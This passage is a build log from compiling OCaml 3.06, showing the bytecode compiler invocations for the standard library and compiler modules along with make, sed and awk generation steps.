../boot/ocamlc -g -warn-error A -nostdlib  -c obj.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c lexing.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c lexing.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c parsing.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c parsing.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c set.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c set.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c map.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c map.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c stack.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c stack.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c queue.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c queue.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c stream.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c stream.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c buffer.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c buffer.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c printf.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c printf.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c format.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c format.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c scanf.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c scanf.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c arg.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c arg.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c printexc.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c printexc.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c gc.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c gc.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c digest.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c digest.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c random.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c random.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib -nopervasives -c camlinternalOO.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c camlinternalOO.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c oo.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c oo.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c genlex.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c genlex.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c callback.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c callback.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c weak.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c weak.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c lazy.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c lazy.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c filename.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c filename.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c int32.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c int32.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c int64.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c int64.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c nativeint.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c nativeint.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c complex.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c complex.ml\n/usr/bin/make EXTRAFLAGS=-nolabels RUNTIME=../boot/ocamlrun \\\n                COMPILER=../boot/ocamlc arrayLabels.cmo listLabels.cmo stringLabels.cmo moreLabels.cmo\nmake[3]: Entering directory `/home/luther/ocaml-3.06/stdlib'\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib -nolabels -c arrayLabels.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib -nolabels -c arrayLabels.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib -nolabels -c listLabels.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib -nolabels -c listLabels.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib -nolabels -c stringLabels.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib -nolabels -c stringLabels.ml\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib -nolabels -c moreLabels.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib -nolabels -c moreLabels.ml\nmake[3]: Leaving directory `/home/luther/ocaml-3.06/stdlib'\ntouch labelled.cmo\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c stdLabels.mli\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c stdLabels.ml\n../boot/ocamlrun ../boot/ocamlc -a -o stdlib.cma pervasives.cmo array.cmo list.cmo char.cmo string.cmo sys.cmo hashtbl.cmo sort.cmo marshal.cmo obj.cmo lexing.cmo parsing.cmo set.cmo map.cmo stack.cmo queue.cmo stream.cmo buffer.cmo printf.cmo format.cmo scanf.cmo arg.cmo printexc.cmo gc.cmo digest.cmo random.cmo camlinternalOO.cmo oo.cmo genlex.cmo callback.cmo weak.cmo lazy.cmo filename.cmo int32.cmo int64.cmo nativeint.cmo complex.cmo arrayLabels.cmo listLabels.cmo stringLabels.cmo moreLabels.cmo stdLabels.cmo\n../boot/ocamlrun ../boot/ocamlc -g -warn-error A -nostdlib  -c std_exit.ml\nif true; then \\\n          echo '#!/usr/bin/ocamlrun' > camlheader && \\\n          echo '#!' | tr -d '\\012' > camlheader_ur; \\\n        else \\\n  /usr/bin/gcc-3.2 -D_FILE_OFFSET_BITS=64 -D_REENTRANT -Wl,-E \\\n                    -DRUNTIME_NAME='\"/usr/bin/ocamlrun\"' \\\n                    header.c -o tmpheader && \\\n          strip tmpheader && \\\n  mv tmpheader camlheader && \\\n          cp camlheader camlheader_ur; \\\n        fi\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/stdlib'\ncd stdlib; cp stdlib.cma std_exit.cmo *.cmi camlheader ../boot\nif test -f boot/libcamlrun.a; then :; else \\\n          ln -s ../byterun/libcamlrun.a boot/libcamlrun.a; fi\nif test -d stdlib/caml; then :; else \\\n          ln -s ../byterun stdlib/caml; fi\ncd byterun; /usr/bin/make all\nmake[2]: Entering directory `/home/luther/ocaml-3.06/byterun'\nmake[2]: Nothing to be done for `all'.\nmake[2]: Leaving directory `/home/luther/ocaml-3.06/byterun'\nif test -f stdlib/libcamlrun.a; then :; else \\\n          ln -s ../byterun/libcamlrun.a stdlib/libcamlrun.a; fi\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c utils/misc.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c utils/misc.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c utils/tbl.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c utils/tbl.ml\nsed -e 's|%%LIBDIR%%|/usr/lib/ocaml/3.06|' \\\n            -e 's|%%BYTERUN%%|/usr/bin/ocamlrun|' \\\n            -e 's|%%CCOMPTYPE%%|cc|' \\\n            -e 's|%%BYTECC%%|/usr/bin/gcc-3.2 -D_FILE_OFFSET_BITS=64 -D_REENTRANT -fPIC|' \\\n            -e 's|%%BYTELINK%%|/usr/bin/gcc-3.2 -Wl,-E|' \\\n            -e 's|%%NATIVECC%%|/usr/bin/gcc-3.2 -D_FILE_OFFSET_BITS=64 -D_REENTRANT|' \\\n            -e 's|%%NATIVELINK%%|/usr/bin/gcc-3.2 |' \\\n            -e 's|%%PARTIALLD%%|ld -r |' \\\n            -e 's|%%BYTECCLIBS%%|-lm -ldl -lcurses -lpthread|' \\\n            -e 's|%%NATIVECCLIBS%%|-lm -ldl|' \\\n            -e 's|%%RANLIBCMD%%|ranlib|' \\\n            -e 's|%%BINUTILS_NM%%||' \\\n            -e 's|%%BINUTILS_OBJCOPY%%||' \\\n            -e 's|%%ARCH%%|none|' \\\n            -e 's|%%MODEL%%|default|' \\\n            -e 's|%%SYSTEM%%|unknown|' \\\n            -e 's|%%EXT_OBJ%%|.o|' \\\n            -e 's|%%EXT_ASM%%|.s|' \\\n            -e 's|%%EXT_LIB%%|.a|' \\\n            -e 's|%%EXT_DLL%%|.so|' \\\n            utils/config.mlp > utils/config.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c utils/config.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c utils/config.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c utils/clflags.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c utils/terminfo.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c utils/terminfo.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c utils/ccomp.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c utils/ccomp.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c utils/warnings.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c utils/warnings.ml\nboot/ocamlrun boot/ocamllex parsing/linenum.mll\n12 states, 322 transitions, table size 1360 bytes\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/linenum.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/linenum.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/location.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/location.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/longident.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/longident.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/syntaxerr.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/syntaxerr.ml\nboot/ocamlyacc -v parsing/parser.mly\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/asttypes.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/parsetree.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/parser.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/parser.ml\nboot/ocamlrun boot/ocamllex parsing/lexer.mll\n131 states, 3270 transitions, table size 13866 bytes\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/lexer.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/lexer.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/parse.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/parse.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/printast.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c parsing/printast.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/ident.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/ident.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/path.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/path.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/primitive.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/primitive.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/types.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/types.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/btype.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/btype.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/outcometree.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/oprint.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/oprint.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/subst.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/subst.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/predef.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/predef.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/datarepr.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/datarepr.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/env.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/env.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/typedtree.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/typedtree.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/ctype.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/ctype.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/printtyp.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/printtyp.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/includeclass.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/includeclass.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/mtype.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/mtype.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/includecore.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/includecore.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/includemod.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/includemod.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/parmatch.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/parmatch.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/typetexp.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/typetexp.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/typecore.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/typecore.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/typedecl.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/typedecl.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/typeclass.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/typeclass.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/typemod.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c typing/typemod.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/lambda.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/lambda.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/printlambda.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/printlambda.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/typeopt.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/typeopt.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/switch.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/switch.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/matching.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/matching.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/translobj.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/translobj.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/translcore.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/translcore.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/translclass.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/translclass.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/translmod.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/translmod.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/simplif.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/simplif.ml\n(echo 'let builtin_exceptions = [|'; \\\n sed -n -e 's|.*/\\* \\(\"[A-Za-z_]*\"\\) \\*/$|  \\1;|p' byterun/fail.h | \\\n sed -e '$s/;$//'; \\\n         echo '|]'; \\\n         echo 'let builtin_primitives = [|'; \\\n         sed -e 's/.*/  \"&\";/' -e '$s/;$//' byterun/primitives; \\\n echo '|]') > bytecomp/runtimedef.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/runtimedef.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/runtimedef.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/meta.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/meta.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/instruct.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/instruct.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/bytegen.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/bytegen.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/printinstr.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/printinstr.ml\nsed -n -e '/^enum/p' -e 's/,//g' -e '/^  /p' byterun/instruct.h | \\\n        awk -f tools/make-opcodes > bytecomp/opcodes.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/opcodes.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/emitcode.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/emitcode.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/bytesections.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/bytesections.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/dll.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/dll.ml\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c bytecomp/symtable.mli\nboot/ocamlrun boot/ocamlc -nostdlib -I boot -warn-error A -I utils -I parsing -I typing -I bytecomp -I asmcomp -I driver -I toplevel -c 